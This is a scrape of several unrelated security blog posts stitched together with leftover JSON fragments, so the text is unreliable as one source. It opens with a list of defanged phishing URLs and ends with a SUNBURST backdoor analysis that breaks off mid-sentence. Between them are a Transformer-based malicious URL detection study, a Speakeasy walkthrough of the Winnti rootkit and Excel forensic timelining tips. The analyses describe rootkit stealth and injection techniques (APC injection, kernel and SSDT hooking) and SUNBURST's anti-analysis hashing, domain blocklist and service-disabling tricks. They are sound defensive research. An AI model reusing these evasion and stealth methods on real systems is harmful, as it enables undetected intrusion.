hxxps://villaluna[.]de/wp-content/info/MARKET/F004f19441/11644210b.php hxxp://sandur[.]dk/wp-content/upgrade/-/MARKET/ hxxps://chistimvse[.]com/es/dhl/MARKET/ hxxps://detmayviet[.]com/wp-includes/widgets/-/MARKET/F004f19441/11644210b.php hxxps://dartebreakfast[.]com/wp-content/plugins/dhl-espress/MARKET/ hxxps://genesisdistributors[.]com/-/Tracking/dhl/Tracking/dhl-tracking/F004f19441/00951124a.php hxxps://www.goldstartechs[.]com/wp-admin/js/widgets/102/F004f19441/11644210b.php hxxps://universalpublicschooltalwandisabo[.]com/DHL hxxps://intranet[.]prorim[.]org[.]br/info/MARKET/F004f19441/11644210b.php hxxps://administrativos[.]cl/mail.php hxxps://nataliadurandpsicologa[.]com[.]br/upgrade/MARKET/F004f19441/11644210b.php hxxps://tanaxinvest[.]com/en/dhl/MARKET/ hxxps://deepbluedivecenter[.]com/clear/item/ hxxps://keystolivingafulfilledlife[.]com/wp-admin/includes/daspoe99i3mdef/DOCUNTRITING hxxps://juneispearlmonth[.]com/-/15454874518741212/dhl-tracking/F004f19441/00951124a.php Subscribe to Blogs Get email updates as new blog posts are added."

                "text": "Highlights Perform a case study on using Transformer models to solve cyber security problems Train a Transformer model to detect malicious URLs under multiple training regimes Compare our model against other deep learning methods, and show it performs on-par with other top-scoring models Identify issues with applying generative pre-training to malicious URL detection, which is a cornerstone of Transformer training in natural language processing (NLP) tasks Introduce novel loss function that balances classification and generative loss to achieve improved performance on the malicious URL detection task Introduction Over the past three years Transformer machine learning (ML) models, or “Transformers” for short, have yielded impressive breakthroughs in a variety of sequence modeling problems, specifically natural language processing (NLP). For example, OpenAI’s latest GPT-3 model is capable of generating long segments of grammatically-correct prose from scratch. Spinoff models, such as those developed for question and answering, are capable of correlating context over multiple sentences. AI Dungeon , a single and multiplayer text adventure game, uses Transformers to generate plausible unlimited content in a variety of fantasy settings. Transformers’ NLP modeling capabilities are apparently so powerful that they pose security risks in their own right, in terms of their potential power to spread disinformation , yet on the other side of the coin, they can be used as powerful tools to detect and mitigate disinformation campaigns. For example, in previous research by the FireEye Data Science team, a NLP Transformer was fine-tuned to detect disinformation on social media sites. Given the power of these Transformer models, it seems natural to wonder if we can apply them to other types of cyber security problems that do not necessarily involve natural language, per se. In this blog post, we discuss a case study in which we apply Transformers to malicious URL detection. Studying Transformer performance on URL detection problem is a first logical step to extending Transformers to more generic cyber security tasks, since URLs are not technically natural language sequences but share some common characteristics with NLP. In the following sections, we outline a typical Transformer architecture and discuss how we adapt it to URLs with a character-focused tokenization. We then discuss loss functions we employ to guide the training of the model, and finally compare our training approaches to more conventional ML-based modeling options. Adapting Transformers to URLs Our URL Transformer operates at the character level, where each character in the URL corresponds to an input token. When a URL is input to our Transformer, it is appended with special tokens—a classification token (“CLS”) that conditions the model to produce a prediction and padding tokens (“PAD”) that normalize the input to a fixed length to allow for parallel training. Each token in the input string is then projected into a character embedding space, followed by a stack of Attention and Feed-Forward Neural Network (FFNN) layers. This stack of layers is similar to the architecture introduced in the original Transformers paper . At a high level, the Attention layers allow each input to be associated with long-distance context of other characters that are important for the classification task, similar to the notion of attention in humans, while the FFNN layers provide capacity for learning the relationships among the combination of inputs and their respective contexts. An illustration of our architecture is shown in Figure 1. Additionally, the URL Transformer employs a masking strategy in its Attention calculation, which enforces a left-to-right (L-R) dependence. This means that only input characters from the left of a given character influence that character’s representation in each layer of the attention stack. The network outputs one embedding for each input character, which captures all information learned by the model about the character sequence up to that point in the input. Once the model is trained, we can use the URL Transformer to perform several different tasks, such as generatively predicting the next character in the input sequence by using the sequence embedding () as an input to another neural network with as softmax output over the possible vocabulary of characters. A specific example of this is shown in Figure 1, where we take the embedding of the input “firee”() and use it to predict the next most likely character, “y.” Similarly, we can use the embedding produced after the classification token to predict other properties of the input sequences, such as their likelihood of maliciousness. Figure 1: High-level overview of the URL Transformer architecture Loss Functions and Training Regimes With the model architecture in hand, we now turn to the question of how we train the model to most effectively detect malicious URLs. Of course, we can train this model in a similar way to other supervised deep learning classifiers by: (1) making predictions on samples from a labeled training set, (2) using a loss function to measure the quality of our predictions, and (3) tune model parameters (i.e., weights) via backpropagation . However, the nature of the Transformer model allows for several interesting variations to this training regime . In fact, one of the reasons that Transformers have become so popular for NLP tasks is because they allow for self-supervised generative pre-training, which takes advantage of massive amounts of unlabeled data to help the model learn general characteristics of the input language before being fine-tuned on the ultimate task at-hand (e.g., question answering, sentiment analysis, etc.). Here, we outline some of the training regimes we explored for our URL Transformer model. Direct Label Prediction (Decode-To-Label) Using a training set of URLs with malicious and benign labels, we can treat the URL Transformer architecture as a feature extractor, whose outputs we use as the input to a traditional classifier (e.g., FFNN or even a random forest). When using a FFNN as our classifier, we can backpropagate the classification loss (e.g., binary cross-entropy) through both the classifier and the Transformer network to adjust the weights to perform classification. This training regime is the baseline for our experiments and is how most deep learning models are trained for classification tasks. Next-Character Prediction Pre-Training and Fine-Tuning Beyond the baseline classification training regime, the NLP literature suggests that one can learn a self-supervised embedding of the input sequence by training the Transformer to perform a next-character prediction task, then fine-tuning the learned representation for the classification problem. A key advantage of this approach is that data used for pre-training does not require malicious or benign labels; instead, the next characters in a URL serve as the labels to be predicted from prior characters in the sequence. This is similar to the example given in Figure 1, where the embedding output is used to predict the next character, “y,” in “fireeye.com.” Overall, this training regime allows us to take advantage of the massive amount of unlabeled data that is typically available in cyber security-related problems. The overall structure of the architecture for this regime is similar to the aforementioned binary classification task, with FFNN layers added for classification. However, since we are now predicting multiple classes (i.e., one class per input character in the vocabulary), we must apply a softmax function to the output to induce a probability distribution over the potential output characters. Once the Transformer portion of the network is pre-trained in this way, we can swap the FFNN classification layers focused on character prediction with new layers that will be trained for the malicious URL classification problem, as in the decode-to-label case. Balanced Mixed-Objective Training Prior work has shown that imbuing the training process with additional knowledge outside of the primary task can help constrain the learning process, and ultimately result in better models. For instance, a malware classifier might train using loss functions that capture malicious/benign classification, malware family prediction, and tag prediction tasks as a mechanism to provide the classifier with broader understanding of the problem than looking at malicious/benign labels in isolation. Inspired by these findings, we also introduced a mixed-objective training regime for our URL Transformer, where we train for binary classification and next-character prediction simultaneously. At each iteration of training, we compute a loss multiplier such that each loss contribution is fixed prior to backpropagation. This ensures that neither loss term dominates during training. Specifically, for minibatch i , let the net loss L Mixed be computed as follows: Given hyperparameters a and b , defined such that a + b : = 1, we compute constant a so that the net loss contribution of L CLS to L Mixed is a and the net contribution of L Next to L Mixed is b . For our evaluations, we set a := b := 0.5, effectively requiring that the model equally balance its ability to generate the next character and accurately predict malicious URLs. Evaluation To evaluate our URL Transformer model and better understand the impact of the three training regimes discussed earlier, we collected a training dataset of over 1M labeled malicious and benign URLs, which was split into roughly 700K training samples, 100K validation samples, and 200k test samples. Additionally, we also developed an unlabeled pre-training dataset of 20M URLs. Using this data, we performed four different training runs for our Transformer model: DecodeToLabel (Baseline): Using strictly the binary cross-entropy loss on the embedded classification features over the entire sequence, we trained the model for 15 epochs using the training set. MixedObjective: We trained the model for 15 epochs on the training set, using both the embedded classification features and the embedded next-character prediction features. FineTune: We pre-trained the model for 15 epochs on the next-character prediction task using the training set, ignoring the malicious/benign labels. We then froze weights over the first 16 layers of the model and trained the model for an additional 15 epochs using a binary cross-entropy loss on the classification labels. FineTune 20M: We performed pre-training on the next-character prediction task using the 20M URL dataset, pre-training for 2 epochs. We then froze weights over the first 16 layers of the Transformer and trained for 15 epochs on the binary classification task. The ROC curve shown in Figure 2 compares the performance of these four training regimes. Here, our baseline DecodeToLabel model (red) yielded a ROC curve with 0.9484 AUC, while the MixedObjective model (green) slightly outperformed the baseline with an AUC of 0.956. Interestingly, both of the fine-tuning models yielded poor classification results, which is counter to the established practice of these Transformer models in the NLP domain. Figure 2: ROC curves for four URL Transformer training regimes To assess the relative efficacy of our Transformer models on this dataset, we also fit several other types of benchmark models developed for URL classification: (1) a Random Forest model on SME-derived features, (2) a 1D Convolutional Neural Network (CNN) model on character embeddings, and (3) a Long Short-Term Memory (LSTM) neural network on character embeddings. Details of these models can be found in our white paper , however we find that our top performing Transformer model performs on-par with the best performing non-Transformer baseline (a 1D CNN model), which perhaps indicates that the long-range dependencies typically learned by Transformer models are not as useful in the case of malicious URL detection. Figure 3: ROC curves comparing URL Transformer to other benchmark URL classification models Summary Our experiments suggest that Transformers can achieve performance comparable to or better than that of other top-performing models for URL classification, though the details of how to achieve that performance differ from common practice. Contrary to findings from the NLP domain , wherein self-supervised pre-training substantially enhances performance in a fine-tuned classification task, similar pretraining approaches actually diminish performance for malicious URL detection. This suggests that the next character prediction task has too little apparent correlation with the task of malicious/benign prediction for effective/stable transfer. Interestingly, utilizing next-character prediction as an auxiliary loss function in conjunction with a malicious/benign loss yields improvements over training solely to predict the label. We hypothesize that while pre-training leads to a relatively poor generative model due to randomized content in the URLs within our dataset, a malicious/benign loss may serve to better condition the generative model learned by the next-character prediction task, distilling a subset of relevant information. It may also be the case that the long-distance relationships that are key to the generative pre-training task are not as important for the final malicious URL classification, as evidenced by the performance of the 1D CNN model. Note that we did not perform a rigorous hyperparameter search for our Transformer, since this research was primarily concerned with loss functions and training regimes. Therefore, it is still an open question as to whether a more optimal architecture, specifically designed for this classification task, could substantially outperform the models described here. While our URL dataset is not representative of all data in the cyber security space, the difficulty of obtaining a readily fine-tuned model from self-supervised pre-training suggests that this approach is unlikely to work well for training Transformers on longer sequences or sequences with lesser resemblance to natural language (e.g., PE files), but an auxiliary loss might work.

                "text": "In August 2020, we released a blog post about how the Speakeasy emulation framework can be used to emulate user mode malware such as shellcode. If you haven’t had a chance, give the post a read today . In addition to user mode emulation, Speakeasy also supports emulation of kernel mode Windows binaries. When malware authors employ kernel mode malware, it will often be in the form of a device driver whose end goal is total compromise of an infected system. The malware most often doesn’t interact with hardware and instead leverages kernel mode to fully compromise the system and remain hidden. Challenges With Dynamically Analyzing Kernel Malware Ideally, a kernel mode sample can be reversed statically using tools such as disassemblers. However, binary packers just as easily obfuscate kernel malware as they do user mode samples. Additionally, static analysis is often expensive and time consuming. If our goal is to automatically analyze many variants of the same malware family, it makes sense to dynamically analyze malicious driver samples. Dynamic analysis of kernel mode malware can be more involved than with user mode samples. In order to debug kernel malware, a proper environment needs to be created. This usually involves setting up two separate virtual machines as debugger and debugee. The malware can then be loaded as an on-demand kernel service where the driver can be debugged remotely with a tool such as WinDbg. Several sandbox style applications exist that use hooking or other monitoring techniques but typically target user mode applications. Having similar sandbox monitoring work for kernel mode code would require deep system level hooks that would likely produce significant noise. Driver Emulation Emulation has proven to be an effective analysis technique for malicious drivers. No custom setup is required, and drivers can be emulated at scale. In addition, maximum code coverage is easier to achieve than in a sandbox environment. Often, rootkits may expose malicious functionality via I/O request packet (IRP) handlers (or other callbacks). On a normal Windows system these routines are executed when other applications or devices send input/output requests to the driver. This includes common tasks such as reading, writing, or sending device I/O control (IOCTLs) to a driver to execute some type of functionality. Using emulation, these entry points can be called directly with doped IRP packets in order to identify as much functionality as possible in the rootkit. As we discussed in the first Speakeasy blog post, additional entry points are emulated as they are discovered. A driver’s DriverMain entry point is responsible for initializing a function dispatch table that is called to handle I/O requests. Speakeasy will attempt to emulate each of these functions after the main entry point has completed by supplying a dummy IRP. Additionally, any system threads or work items that are created are sequentially emulated in order to get as much code coverage as possible. Emulating a Kernel Mode Implant In this blog post, we will show an example of Speakeasy’s effectiveness at emulating a real kernel mode implant family publicly named Winnti. This sample was chosen despite its age because it transparently implements some classic rootkit functionality. The goal of this post is not to discuss the analysis of the malware itself as it is fairly antiquated. Rather, we will focus on the events that are captured during emulation. The Winnti sample we will be analyzing has SHA256 hash c465238c9da9c5ea5994fe9faf1b5835767210132db0ce9a79cb1195851a36fb and the original file name tcprelay.sys . For most of this post, we will be examining the emulation report generated by Speakeasy. Note: many techniques employed by this 32-bit rootkit will not work on modern 64-bit versions of Windows due to Kernel Patch Protection (PatchGuard) which protects against modification of critical kernel data structures. To start, we will instruct Speakeasy to emulate the kernel driver using the command line shown in Figure 1. We instruct Speakeasy to create a full memory dump (using the “-d” flag) so we can acquire memory later. We supply the memory tracing flag (“-m”) which will log all memory reads and writes performed by the malware. This is useful for detecting things like hooking and direct kernel object manipulation (DKOM). Figure 1: Command line used to emulate the malicious driver Speakeasy will then begin emulating the malware’s DriverEntry function. The entry point of a driver is responsible for setting up passive callback routines that will service user mode I/O requests as well as callbacks used for device addition, removal, and unloading. Reviewing the emulation report for the malware’s DriverEntry function (identified in the JSON report with an “ep_type” of “entry_point”), shows that the malware finds the base address of the Windows kernel. The malware does this by using the ZwQuerySystemInformation API to locate the base address for all kernel modules and then looking for one named “ntoskrnl.exe”. The malware then manually finds the address of the PsCreateSystemThread API. This is then used to spin up a system thread to perform its actual functionality. Figure 2 shows the APIs called from the malware's entry point. Figure 2: Key functionality in the tcprelay.sys entry point Hiding the Driver Object The malware attempts to hide itself before executing its main system thread. The malware first looks up the “DriverSection” field in its own DRIVER_OBJECT structure. This field holds a linked list containing all loaded kernel modules and the malware attempts to unlink itself to hide from APIs that list loaded drivers. In the “mem_access” field in the Speakeasy report shown in Figure 3, we can see two memory writes to the DriverSection entries before and after itself which will remove itself from the linked list. Figure 3: Memory write events representing the tcprelay.sys malware attempting to unlink itself in order to hide As noted in the original Speakeasy blog post , when threads or other dynamic entry points are created at runtime, the framework will follow them for emulation. In this case, the malware created a system thread and Speakeasy automatically emulated it. Moving on to the newly created thread (identified by an “ep_type” of “system_thread”), we can see the malware begin its real functionality. The malware begins by enumerating all running processes on the host, looking for the service controller process named services.exe. It's important to note that the process listing that gets returned to the emulated samples is configurable via JSON config files supplied at runtime. For more information on these configuration options please see the Speakeasy README on our GitHub repository . An example of this configurable process listing is shown in Figure 4. Figure 4: Process listing configuration field supplied to Speakeasy Pivoting to User Mode Once the malware locates the services.exe process, it will attach to its process context and begin inspecting user mode memory in order to locate the addresses of exported user mode functions. The malware does this so it can later inject an encoded, memory-resident DLL into the services.exe process. Figure 5 shows the APIs used by the rootkit to resolve its user mode exports. Figure 5: Logged APIs used by tcprelay.sys rootkit to resolve exports for its user mode implant Once the exported functions are resolved, the rootkit is ready to inject the user mode DLL component. Next, the malware manually copies the in-memory DLL into the services.exe process address space. These memory write events are captured and shown in Figure 6. Figure 6: Memory write events captured while copying the user mode implant into services.exe A common technique that rootkits use to execute user mode code involves a Windows feature known as Asynchronous Procedure Calls (APC). APCs are functions that execute asynchronously within the context of a supplied thread. Using APCs allows kernel mode applications to queue code to run within a thread’s user mode context. Malware often wants to inject into user mode since much of the common functionality (such as network communication) within Windows can be more easily accessed. In addition, by running in user mode, there is less risk of being detected in the event of faulty code bug-checking the entire machine. In order to queue an APC to fire in user mode, the malware must locate a thread in an “alertable” state. Threads are said to be alertable when they relinquish their execution quantum to the kernel thread scheduler and notify the kernel that they are able to dispatch APCs. The malware searches for threads within the services.exe process and once it detects one that’s alertable it will allocate memory for the DLL to inject then queue an APC to execute it. Speakeasy emulates all kernel structures involved in this process, specifically the executive thread object ( ETHREAD ) structures that are allocated for every thread on a Windows system. Malware may attempt to grovel through this opaque structure to identify when a thread’s alertable flag is set (and therefore a valid candidate for an APC). Figure 7 shows the memory read event that was logged when the Winnti malware manually parsed an ETHREAD structure in the services.exe process to confirm it was alertable. At the time of this writing, all threads within the emulator present themselves as alertable by default. Figure 7: Event logged when the tcprelay.sys malware confirmed a thread was alertable Next, the malware can execute any user mode code it wants using this thread object. The undocumented functions KeInitializeApc and KeInsertQueueApc will initialize and execute a user mode APC respectively. Figure 8 shows the API set that the malware uses to inject a user mode module into the services.exe process. The malware executes a shellcode stub as the target of the APC that will then execute a loader for the injected DLL. All of this can be recovered from the memory dump package and analyzed later. Figure 8: Logged APIs used by tcprelay.sys rootkit to inject into user mode via an APC Network Hooks After injecting into user mode, the kernel component will attempt to install network obfuscation hooks (presumably to hide the user mode implant). Speakeasy tracks and tags all memory within the emulation space. In the context of kernel mode emulation, this includes all kernel objects (e.g. Driver and Device objects, and the kernel modules themselves). Immediately after we observe the malware inject its user mode implant, we see it begin to attempt to hook kernel components. This was confirmed during static analysis to be used for network hiding. The memory access section of the emulation report reveals that the malware modified the netio.sys driver, specifically code within the exported function named NsiEnumerateObjectsAllParametersEx . This function is ultimately called when a user on the system runs the “netstat” command and it is likely that the malware is hooking this function in order to hide connected network ports on the infected system. This inline hook was identified by the event captured in Figure 9. Figure 9: Inline function hook set by the malware to hide network connections In addition, the malware hooks the Tcpip driver object in order to accomplish additional network hiding. Specifically, the malware hooks the IRP_MJ_DEVICE_CONTROL handler for the Tcpip driver. User mode code may send IOCTL codes to this function when querying for active connections. This type of hook can be easily identified with Speakeasy by looking for memory writes to critical kernel objects as shown in Figure 10. Figure 10: Memory write event used to hook the Tcpip network driver System Service Dispatch Table Hooks Finally, the rootkit will attempt to hide itself using the nearly ancient technique of system service dispatch table (SSDT) patching. Speakeasy allocates a fake SSDT so malware can interact with it. The SSDT is a function table that exposes kernel functionality to user mode code. The event in Figure 11 shows that the SSDT structure was modified at runtime. Figure 11: SSDT hook detected by Speakeasy If we look at the malware in IDA Pro, we can confirm that the malware patches the SSDT entry for the ZwQueryDirectoryFile and ZwEnumerateKey APIs that it uses to hide itself from file system and registry analysis. The SSDT patch function is shown in Figure 12. Figure 12: File hiding SSDT patching function shown in IDA Pro After setting up these hooks, the system thread will exit. The other entry points (such as the IRP handlers and DriverUnload routines) in the driver are less interesting and contain mostly boilerplate driver code. Acquiring the Injected User Mode Implant Now that we have a good idea what the driver does to hide itself on the system, we can use the memory dumps created by Speakeasy to acquire the injected DLL discussed earlier. Opening the zip file we created at emulation time, we can find the memory tag referenced in Figure 6. We quickly confirm the memory block has a valid PE header and it successfully loads into IDA Pro as shown in Figure 13. Figure 13: Injected user mode DLL recovered from Speakeasy memory dump Conclusion In this blog post, we discussed how Speakeasy can be effective at automatically identifying rootkit activity from the kernel mode binary. Speakeasy can be used to quickly triage kernel binaries that may otherwise be difficult to dynamically analyze. For more information and to check out the code, head over to our GitHub repository .

One of the most effective tools to perform this type of analysis is one that is in almost everyone’s toolkit: Microsoft Excel. In this article we will detail some tips and tricks with Excel to perform analysis when presented with any type of data. Summarizing Verbose Artifacts Tools such as FireEye Redline include handy timeline features to combine multiple artifact types into one concise timeline. When we use individual parsers or custom artifact formats, it may be tricky to view multiple types of data in the same view. Normalizing artifact data with Excel to a specific set of easy-to-use columns makes for a smooth combination of different artifact types. Consider trying to review parsed file system, event log, and Registry data in the same view using the following data. $SI Created $SI Modified File Name File Path File Size File MD5 File Attributes File Deleted 2019-10-14 23:13:04 2019-10-14 23:33:45 Default.rdp C:\\Users\\ attacker\\Documents\\ 485 c482e563df19a40 1941c99888ac2f525 Archive FALSE Event Gen Time Event ID Event Message Event Category Event User Event System 2019-10-14 23:13:06 4648 A logon was attempted using explicit credentials.

If we format the data using Excel string concatenation, we can make the data easy to combine into a single timeline view. To format the data, we can use the “&” operation with a function to join information we may need into a “Summary” field. An example command to join the relevant file system data delimited by ampersands could be “=D2 & \" | \" & C2 & \" | \" & E2 & \" | \" & F2 & \" | \" & G2 & \" | \" & H2”. Combining this format function with a “Timestamp” and “Timestamp Type” column will complete everything we need for streamlined analysis.

Time Zone Conversions One of the most critical elements of incident response and forensic analysis is timelining. Temporal analysis will often turn up new evidence by identifying events that precede or follow an event of interest. Equally critical is producing an accurate timeline for reporting. Timestamps and time zones can be frustrating, and things can get confusing when the systems being analyzed span various time zones. Mandiant tracks all timestamps in Coordinated Universal Time (UTC) format in its investigations to eliminate any confusion of both time zones and time adjustments such as daylight savings and regional summer seasons. Of course, various sources of evidence do not always log time the same way. Some may be local time, some may be UTC, and as mentioned, data from sources in various geographical locations complicates things further. When compiling timelines, it is important to first know whether the evidence source is logged in UTC or local time. If it is logged in local time, we need to confirm which local time zone the evidence source is from. Then we can use the Excel TIME()  formula to convert timestamps to UTC as needed. This example scenario is based on a real investigation where the target organization was compromised via phishing email, and employee direct deposit information was changed via an internal HR application. In this situation, we have three log sources: email receipt logs, application logins, and application web logs. The email logs are recorded in UTC and contain the following information: The application logins are recorded in Eastern Daylight Time (EDT) and contain the following: The application web logs are also recorded in Eastern Daylight Time (EDT) and contain the following: To take this information and turn it into a master timeline, we can use the CONCAT function (an alternative to the ampersand concatenation used previously) to make a summary of the columns in one cell for each log source, such as this example formula for the email receipt logs: This is where checking our time zones for each data source is critical. If we took the information as it is presented in the logs and assumed the timestamps were all in the same time zone and created a timeline of this information, it would look like this: As it stands the previous screenshot, we have some login events to the HR application, which may look like normal activity for the employees. Then later in the day, they receive some suspicious emails. If this were hundreds of lines of log events, we would risk the login and web log events being overlooked as the time of activity precedes our suspected initial compromise vector by a few hours. If this were a timeline used for reporting, it would also be inaccurate. When we know which time zone our log sources are in, we can adjust the timestamps accordingly to reflect UTC. In this case, we confirmed through testing that the application logins and web logs are recorded in EDT, which is four hours behind UTC, or “UTC-4”. To change these to UTC time, we just need to add four hours to the time. The Excel TIME function makes this easy. We can just add a column to the existing tables, and in the first cell we type “=A2+TIME(4,0,0)”. Breaking this down: =A2 Reference cell A2 (in this case our EDT timestamp). Note this is not an absolute reference, so we can use this formula for the rest of the rows. +TIME This tells Excel to take the value of the data in cell A2 as a “time” value type and add the following amount of time to it: (4,0,0) The TIME function in this instance requires three values, which are, from left to right: hours, minutes, seconds. In this example, we are adding 4 hours, 0 minutes, and 0 seconds. Now we have a formula that takes the EDT timestamp and adds four hours to it to make it UTC. Then we can replicate this formula for the rest of the table. The end result looks like this: When we have all of our logs in the same time zone, we are ready to compile our master timeline. Taking the UTC timestamps and the summary events we made, our new, accurate timeline looks like this: Now we can clearly see suspicious emails sent to (fictional) employees Austin and Dave. A few minutes later, Austin’s account logs into the HR application and adds a new bank account. After this, we see the same email sent to Jake. Soon after this, Jake’s account logs into the HR application and adds the same bank account information as Austin’s. Converting all our data sources to the same time zone with Excel allowed us to quickly link these events together and easily identify what the attacker did. Additionally, it provided us with more indicators, such as the known-bad bank account number to search for in the rest of the logs. Pro Tip: Be sure to account for log data spanning over changes in UTC offset due to regional events such as daylight savings or summer seasons. For example, local time zone adjustments will need to change for logs in United States Eastern Time from Virginia, USA from +TIME(5,0,0) to +TIME(4,0,0) the first weekend in March every year and back from +TIME(4,0,0) to +TIME(5,0,0) the first weekend in November to account for daylight and standard shifts . CountIf for Log Baselining When reviewing logs that record authentication in the form of a user account and timestamp, we can use COUNTIF to establish simple baselines to identify those user accounts with inconsistent activity. In the example of user logons that follows, we'll use the formula \"=COUNTIF($B$2:$B$25,B2)\" to establish a historical baseline. Here is a breakdown of the parameters for this COUNTIF formula located in C2 in our example: COUNTIF This Excel formula counts how many times a value exists in a range of cells. $B$2:$B$25 This is the entire range of all cells, B2 through B25, that we want to use as a range to search for a specific value. Note the use of \"$\" to ensure that the start and end of the range are an absolute reference and are not automatically updated by Excel if we copy this formula to other cells. B2 This is the cell that contains the value we want to search for and count occurrences of in our range of $B$2:$B$25. Note that this parameter is not an absolute reference with a preceding \"$\". This allows us to fill the formula down through all rows and ensure that we are counting the applicable user name. To summarize, this formula will search the username column of all logon data and count how many times the user of each logon has logged on in total across all data points. When most user accounts log on regularly, a compromised account being used to logon for the first time may clearly stand out when reviewing total log on counts. If we have a specific time frame in mind, it may be helpful to know which accounts first logged on during that time. The COUNTIF formula can help track accounts through time to identify their first log on which can help identify rarely used credentials that were abused for a limited time frame. We'll start with the formula \"=COUNTIF($B$2:$B2,B2)\" in cell D3. Here is a breakdown of the parameters  for this COUNTIF formula. Note that the use of \"$\" for absolute referencing is slightly different for the range used, and that is an importance nuance: COUNTIF This Excel formula counts how many times a value exists in a range of cells. $B$2:$B2 This is the range of cells, B2 through B2, that we want to start with. Since we want to increase our range as we go through the rows of the log data, the ending cell row number (2 in this example) is not made absolute. As we fill this formula down through the rest of our log data, it will automatically expand the range to include the current log record and all previous logs. B2 This cell contains the value we want to search for and provides a count of occurrences found in our defined range. Note that this parameter B2 is not an absolute reference with a preceding \"$\". This allows us to fill the formula down through all rows and ensure that we are counting the applicable user name. To summarize, this formula will search the username column of all logon data before and including the current log and count how many times the user of each logon has logged on up to that point in time. The following example illustrates how Excel automatically updated the range for D15 to $B$2:$B15 using the fill handle . To help visualize a large data set, let's add color scale conditional formatting to each row individually. To do so: Select only the cells we want to compare with the color scale (such as D2 to D25). On the Home menu, click the Conditional Formatting button in the Styles area. Click Color Scales. Click the type of color scale we would like to use. The following examples set the lowest values to red and the highest values to green. We can see how: Users with lower authentication counts contrast against users with more authentications. The first authentication times of users stand out in red. Whichever colors are used, be careful not to assume that one color, such as green, implies safety and another color, such as red, implies maliciousness. Conclusion The techniques described in this post are just a few ways to utilize Excel to perform analysis on arbitrary data. While these techniques may not leverage some of the more powerful features of Excel, as with any variety of skill set, mastering the fundamentals enables us to perform at a higher level. Employing fundamental Excel analysis techniques can empower an investigator to work through analysis of any presented data type as efficiently as possible.

                "text": "FireEye has discovered additional details about the SUNBURST backdoor since our initial publication on Dec. 13, 2020. Before diving into the technical depth of this malware, we recommend readers familiarize themselves with our blog post about the SolarWinds supply chain compromise , which revealed a global intrusion campaign by a sophisticated threat actor we are currently tracking as UNC2452. SUNBURST is a trojanized version of a digitally signed SolarWinds Orion plugin called SolarWinds.Orion.Core.BusinessLayer.dll . The plugin contains a backdoor that communicates via HTTP to third party servers. After an initial dormant period of up to two weeks, SUNBURST may retrieve and execute commands that instruct the backdoor to transfer files, execute files, profile the system, reboot the system, and disable system services. The malware's network traffic attempts to blend in with legitimate SolarWinds activity by imitating the Orion Improvement Program (OIP) protocol and persistent state data is stored within legitimate plugin configuration files. The backdoor uses multiple obfuscated blocklists to identify processes, services, and drivers associated with forensic and anti-virus tools. In this post, the following topics are covered in greater detail: Anti-Analysis Environment Checks and Blocklists Domain Generation Algorithm and Variations Command and Control (C2) behaviors for DNS A and CNAME records Malware modes of operation Anti-Analysis Environment Checks Before reaching out to its C2 server, SUNBURST performs numerous checks to ensure no analysis tools are present. It checks process names, file write timestamps, and Active Directory (AD) domains before proceeding. We believe that these checks helped SUNBURST evade detection by anti-virus software and forensic investigators for seven months after its introduction to the SolarWinds Orion supply chain. First, the backdoor verifies that the lowercase name of the current process is solarwinds.businesslayerhost . UNC2452 avoided including this string directly in the source code by computing a hash of the string and comparing the result to the 64-bit number 17291806236368054941 . The hash value is calculated as a standard FNV-1A 64-bit hash with an additional XOR by the 64-bit number 6605813339339102567 . The additional XOR operation forces malware analysts to develop custom tools to brute force the hash preimage. Next, the backdoor only executes if the filesystem last write time of the .NET assembly SolarWinds.Orion.Core.BusinessLayer.dll is at least 12 to 14 days prior to the current time. The exact threshold is selected randomly from this interval. In other words, SUNBURST lays low for almost two weeks before raising its head. If the timestamp check fails, the backdoor will execute again at a random later time when it is invoked by a legitimate recurring background task. Once the threshold is met, the sample creates the named pipe 583da945-62af-10e8-4902-a8f205c72b2e to ensure only one instance of the backdoor is running. If the named pipe already exists, the malware exits. SUNBURST stores its configuration in the legitimate SolarWinds.Orion.Core.BusinessLayer.dll.config file. It repurposes two existing settings in the appSettings section: ReportWatcherRetry and ReportWatcherPostpone . During initialization, the backdoor determines if the ReportWatcherRetry setting is the value 3 . This value indicates the malware has been deactivated and will no longer perform any network activity. As we describe later, UNC2452 can command the backdoor to disable itself. This feature may be utilized when the operator determines the victim is not of interest or that they’ve completed their mission. When investigating a system compromised by SUNBURST, review this setting to determine if the backdoor has been disabled. Note, the presence of this value does not offer proof the actor did not further compromise the environment before disabling SUNBURST. The backdoor also determines if the system is joined to an Active Directory (AD) domain and, if so, retrieves the domain name. Execution ceases if the system is not joined to an AD domain. SUNBURST checks the AD domain name against a blocklist and halts execution if it contains one of the following values: swdev.local emea.sales pci.local apac.lab swdev.dmz cork.lab saas.swi dmz.local lab.local dev.local lab.rio lab.brno lab.na test solarwinds We suspect these hard-coded AD domains may be SolarWinds internal domains that UNC2452 wanted to avoid. Finally, SUNBURST verifies the system has internet connectivity by ensuring it can resolve the DNS name api.solarwinds.com . Otherwise, execution stops and retries at a random later time. Anti-Analysis Blocklists SUNBURST's behavior is affected by the presence of malware analysis and security software. To disguise the strings used to detect these security tools, UNC2452 calculated and embedded a hash value for each string. While it is trivial for the backdoor to check for the existence of a hashed process name, it is computationally expensive to determine what string a hash value corresponds to (the “preimage”). However, thanks to some hard work by members of the information security community, the hashes have been successfully brute-forced. The list of hashes and their corresponding strings can be viewed at this FireEye GitHub page . SUNBURST uses the aforementioned FNV-1A plus XOR algorithm to compute the hash of each process name, service name, and driver filename on the system. If a blocklisted process or driver name is found, SUNBURST pauses and tries again later. The backdoor continues past this check only when there are no processes nor drivers from the blocklist present. If a blocklisted service is found, SUNBURST attempts to disable the blocklisted service by manipulating the service configuration in the Windows Registry. It sets the registry value HKLM\\SYSTEM\\CurrentControlSet\\services\\<service_name>\\Start to the value 4 , which corresponds to SERVICE_DISABLED . As a result, the blocklisted service is disabled on the next power cycle . This means the presence of a blocklisted service on a compromised host does not make a system immune to SUNBURST. After the registry modification is made, SUNBURST updates the ReportWatcherPostpone configuration value to reflect the service it disabled. Then, the backdoor pauses and retries the process and service blocklist checks at a later time. Subsequent service blocklist checks skip services already present in the ReportWatcherPostpone configuration key. SUNBURST will not treat the services it has disabled as members of the blocklist anymore. Therefore, during an incident response, forensic teams should consider recovering and decoding this configuration key to parse out which services SUNBURST attempted to disable. Domain Generation Algorithm In this section we describe how SUNBURST uses an intermediary command and control (C2) coordinator to retrieve its final C2 server. The C2 coordinator instructs the backdoor to continue or halt beaconing. It also redirects SUNBURST to its final C2 server via DNS CNAME records. We believe this enables UNC2452 to compartmentalize their operations, limiting the network infrastructure shared among victims. The C2 coordinator is implemented as the authoritative DNS server for the avsvmcloud[.]com domain. To communicate with 